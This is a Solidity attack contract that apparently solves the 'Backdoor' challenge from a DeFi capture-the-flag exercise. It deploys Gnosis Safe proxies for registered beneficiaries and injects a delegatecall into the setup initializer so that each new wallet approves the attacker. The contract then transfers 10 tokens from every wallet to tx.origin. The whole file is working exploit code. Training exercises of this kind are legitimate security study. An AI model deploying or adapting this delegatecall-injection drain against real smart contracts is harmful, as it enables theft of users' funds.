// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "./WalletRegistry.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
contract BackdoorAttacker2 {
    constructor(
        GnosisSafeProxyFactory _factory, 
        WalletRegistry _registry,
        address _singleton,
        address _token,
        address[] memory initialBeneficiaries
    ) {
        BackdoorAttacker attacker = new BackdoorAttacker(_factory, _registry, _singleton, _token, initialBeneficiaries);
        attacker.attack();
    }
}
contract BackdoorAttacker {
    uint256 private constant EXPECTED_OWNERS_COUNT = 1;
    uint256 private constant EXPECTED_THRESHOLD = 1;
    uint256 private constant PAYMENT_AMOUNT = 10 ether;

    GnosisSafeProxyFactory private factory;
    WalletRegistry private registry;
    address singleton;
    address token;
    address[] beneficiaries;
    constructor(
        GnosisSafeProxyFactory _factory, 
        WalletRegistry _registry,
        address _singleton,
        address _token,
        address[] memory initialBeneficiaries
    ) {
        factory = _factory;
        registry = _registry;
        singleton = _singleton;
        token = _token;
        for (uint i=0; i<initialBeneficiaries.length; i++) {
            beneficiaries.push(initialBeneficiaries[i]);
        }
    }
    //tokenApprove will be used as delegatecall
    function tokenApprove(address _token, address spender) external {
        IERC20(_token).approve(spender, PAYMENT_AMOUNT);
    }
    function attack() external {
        address[] memory _owners = new address[](1);
        uint _threshold = EXPECTED_THRESHOLD;
        address to = address(this);
        bytes memory data = abi.encodeWithSignature("tokenApprove(address,address)", token,address(this));
        address fallbackHandler = address(0);
        address paymentToken = address(0);
        uint256 payment = 0;
        address paymentReceiver = address(0);
        for (uint i=0; i<beneficiaries.length; i++) {
            _owners[0] = beneficiaries[i];
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                _owners, _threshold, to, data, fallbackHandler, paymentToken, payment, paymentReceiver
            );
            GnosisSafeProxy proxy = factory.createProxyWithCallback(singleton, initializer, i, registry);
            IERC20(token).transferFrom(address(proxy), tx.origin, PAYMENT_AMOUNT);
        }
    }
}